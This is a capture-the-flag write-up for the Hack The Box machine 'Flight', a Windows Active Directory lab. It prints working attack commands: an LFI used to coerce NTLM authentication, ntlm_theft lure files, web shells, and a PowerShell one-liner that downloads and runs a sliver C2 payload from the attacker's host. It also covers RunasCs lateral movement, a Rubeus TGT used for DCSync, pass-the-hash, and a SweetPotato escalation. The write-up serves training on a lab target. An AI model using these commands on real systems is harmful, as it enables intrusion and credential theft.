---
title: Flight
date: 2026-09-12
description: Medium Windows AD chain from an LFI on a school subdomain — NTLM theft into a writable share, sliver C2 with RunasCs lateral movement, and a virtual-account Rubeus TGT for DCSync.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Sat Sep 12 07:00:30 2026 as: /usr/lib/nmap/nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49673,49674,49696,56770 -A -oN scan_results.txt 10.129.228.120
Nmap scan report for flight.htb (10.129.228.120)
Host is up (0.71s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-12 18:07:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
56770/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-12T18:08:28
|_  start_date: N/A
|_clock-skew: 7h06m24s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   633.88 ms 10.10.16.1
2   940.03 ms flight.htb (10.129.228.120)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 12 07:02:54 2026 -- 1 IP address (1 host up) scanned in 143.70 seconds

```

No anonymous LDAP bind and no guest SMB user. Port 80 serves nothing interesting — just phpmyadmin — but enumeration turned up a subdomain, `school.flight.htb`, which holds a file inclusion on the **view** parameter of index.php. Verify the inclusion with the **absolute path** of the hosts file, a default file on every Windows machine:

```URL
index.php?view=C:\Windows\system32\drivers\etc\hosts
```

It filters the URL based on the `\`, but the check can be sidestepped:

```URL
index.php?view=C:/Windows/system32/drivers/etc/hosts
```

Verified. Now point it at a python server (or responder) to capture the web server's auth:

```URL
index.php?view=//10.10.16.82/y
```

Grabbed the NTLM hash:

> `svc_apache - S@Ss!K@*t13`

Shares with `svc_apache` — Web, Shared, and Users — are all readable, but there's nothing useful inside; **Users** just holds the home directory of `c.bum`. Grab the usernames with `svc_apache` and spray the **password** across them, since the person who built the web page is usually a domain user too:

> `S.moon - S@Ss!K@*t13`

Now the shares look different: **Shared** is writable, but it's empty.

# User

## NTLM_theft

NTLM Theft is an open-source Python3 tool that generates 23 different types of NTLMv2 hash theft documents for credential capture attacks.

**How it works** :
The tool creates malicious files that trigger SMB authentication requests to a controlled server, capturing NTLMv2 hashes. All attack methods use "intended functionality," making them less likely to be caught by antivirus (17 of 21 variants bypassed Windows Defender as of June 2020).

> https://github.com/Greenwolf/ntlm_theft

Clone the repo and generate the malicious files:

```python
python3 ntlm_theft.py -g all -s 10.10.16.82 -f htb
```

Upload the files to the writable share one by one with **put** while responder listens:

```sh
> put desktop.ini
```

One of the uploaded files triggers authentication — responder grabs the creds (here it was desktop.ini):

> `C.Bum - Tikkycoll_431012284` 

Log in to SMB as C.Bum and grab the user flag from the Users share in c.bum's directory. C.Bum has no shell access, but the Web share is writable by C.bum, and it holds two directories:

- `flight.htb`
- `school.flight.htb`

Upload a `backdoor.php` into either folder with **put** and hit it from the url — reverse shell as `svc_apache`. We could continue from there, but sliver C2 makes the lateral movement much nicer.

## Sliver
### Installation

```sh
sudo apt install sliver-server
```

### Run

```sh
sliver-server
```

### Create a payload

- One-liner:

```sh
sliver > generate --os windows --arch 64bit --mtls 10.10.16.82 --reconnect 60 --save htb.exe mtls 
```

- Manual:

```
sliver > generate
```

It will compile and create a payload **htb.exe**, then start a listener:

```
sliver > mtls
```

Setup a python server to host the payload.

---
> Payload : 

```
powershell -c "wget 10.10.16.82/htb.exe -usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\htb.exe
```
A **powershell** payload downloads the payload from the server, with `-usebasiparsing` for faster download (it tells PowerShell to use a basic HTML parsing method); it saves the output to the target directory and then executes it.
---

```URL
http://flight.htb/bd.php?cmd=powershell%20-c%20%22wget%2010.10.16.82%2Fhtb.exe%20-usebasicparsing%20-outfile%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe%3B%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe
```

or

```sh
curl 'http://flight.htb/bd.php?cmd=powershell%20-c%20%22wget%2010.10.16.82%2Fhtb.exe%20-usebasicparsing%20-outfile%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe%3B%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe'
```

Once the payload executes, we have the sliver session as `svc_apache`. Sessions are accessed with:

```sh
sliver > sessions -i 3ac
```

> **Note**: 1st **3 letters** of `session id` is enough

Since we have creds, we can use `runas`:

```sh
sliver (FAINT_TEXT) > shell
```

But first check for **privesc** with:

```powershell
Ps > cmdkey /list
```

Stored creds for c.bum show up:

```powershell
Ps > runas /noprofile /savecred /user:c.bum powershell
```

It prompts for the password interactively — **RunasCs.exe** executes `runas` without the prompt.

### RunasCs.exe

> https://github.com/antonioCoco/RunasCs/releases

Upload the binary:

> **Note** : ctrl+d -> to detach from current session in sliver>

```sh
sliver (FAINT_TEXT) > upload RunasCs.exe
sliver (FAINT_TEXT) > shell
```

```powershell
Ps > .\RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "C:\users\public\music\htb.exe"
```

Gained shell session as `c.bum`

# Root

Detach and access the `c.bum` session:

```sh
sliver > sessions -i 6f4
sliver (FAINT_TEXT) > shell
```

```powershell
Ps > whoami /all
```

`c.bum` is part of a group called **WebDevs** — unusual.

```powershell
Get-NetTCPConnection -State Listen
```

Same as `netstat -ano`, but limited to **tcp ports**. Also noticed `C:\inetpub` — an IIS server on the system, and **port 8000** is listening, which isn't a default port.

Using sliver to create a SOCKS proxy — exit the shell first:

```
sliver (FAINT_TEXT) > socks5 start
```

With the SOCKS tunnel up, reach the internal IIS server by adding **FoxyProxy** to **firefox** pointed at the sliver SOCKS5 port.

By reviewing **inetpub** we can see `C:\inetpub\development` is what's being hosted. Since c.bum is in WebDevs, he holds write access to that folder. It runs the **ASP.NET** framework.

---
 **ASPX** (Active Server Pages Extended) is Microsoft's server-side web technology, and **IIS** (Internet Information Services) is Microsoft's web server. They're built together as a native stack.

---

Upload a `backdoor.aspx` to `/development` with sliver:

```ssh
sliver (FAINT_TEXT) > upload backdoor.aspx 'C:\inetpub\development\backdoor.aspx'
```

Trigger it on the url (or curl):

```URL
http://127.0.0.1:8000/backdoor.aspx?cmd=C:\users\public\music\htb.exe
```

The payload runs — session as `APPPOOL\DeafultAppPool`.

Two ways to escalate: `SeImpersonatePrivilege`, or the fact that **APPPOOL\DefaultAppPool** — this "**user**" is in fact a **Microsoft Virtual Account** and according to Microsoft:
> Services that run as virtual accounts access network resources by using the credentials of the computer account in the format `<domain_name>\<computer_name>$`.

That means we can use **Rubeus** from our current session to request a ticket for ourselves (the machine account) and perform a DCSync attack.

> Note: **armory** which comes along with **sliver** has a **Rubeus** module that makes exploitation a bit easier

#### Installation of rubeus module

```
silver > armory install rubeus
```

Then run `rubeus` in the current session, which is **Default AppPool**:

```
sliver (FAINT_TEXT) > rubeus tgtdeleg /nowrap
```

The purpose is to extract a Kerberos Ticket Granting Ticket (TGT) without credentials. The command breaks down into these components:

- `rubeus` — Kerberos exploitation tool (C#-based)
- `tgtdeleg` — TGT Delegation attack module
- `/nowrap` — Output base64 as single line (not wrapped)

It works in four steps: first it sends a Kerberos request to the Domain Controller, then requests a TGT using GSS-API, extracts the ticket and returns it as base64, and finally the ticket can be used for lateral movement or further attacks. Extracted the ticket.kirbi, now decode it:

```sh
cat ticket.b64 | base64 -d > ticket.kirbi
```

### kirbi2ccache

```python
pip install minikerberos
```

**minikerberos** holds the **kirbi2ccache** module:

```python
minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
```

Now use `impacket-secretsdump` to dump the NTLM hashes:

```sh
export KRB5CCNAME=ticket.ccache
```

> **Note**: The clock-skew changed when the machine restarted

```sh
faketime "now -16 hours -56 minutes -05 seconds" impacket-secretsdump -k -no-pass g0.flight.htb -target-ip 10.129.228.120 -just-dc-user Administrator
```

With `-just-dc-user`, only the hash of the particular user is dumped. **pth-winexe** works because there's no winrm service:

```sh
pth-winexe -U FLIGHT/Administrator //10.129.228.120 cmd.exe 
```

Gained `root`

---
## Alternative way

```
SeImpersonatePrivilge
```

The "user" **IIS APPPOOL\DefaultAppPool** is a service/virtual account. This means it has **SeImpersonatePrivilege** enabled.

> https://jlajara.gitlab.io/Potatoes_Windows_Privesc

This privilege is associated with a family of exploits known as "potatoes". Essentially what you are trying to achieve is to force the machine to authenticate as **NT AUTHORITY\SYSTEM** to a process you control and then, because you have the **SeImpersonatePrivilege**, create a new process that runs as NT AUTHORITY\SYSTEM. For this example, let's use **SweetPotato** that's actually a collection of potatoes. After you build the project using VisualStudio you can use sliver once again to upload the executable and get a **new session as SYSTEM**.

> https://github.com/CCob/SweetPotato

```sh
sliver > cd "C:\users\public\music"
sliver > upload SweetPotato.exe
sliver > shell
```

```powershell
.\SweetPotato.exe -e EfsRpc -p "C:\users\public\music\htb.exe"
```

Gained `root`
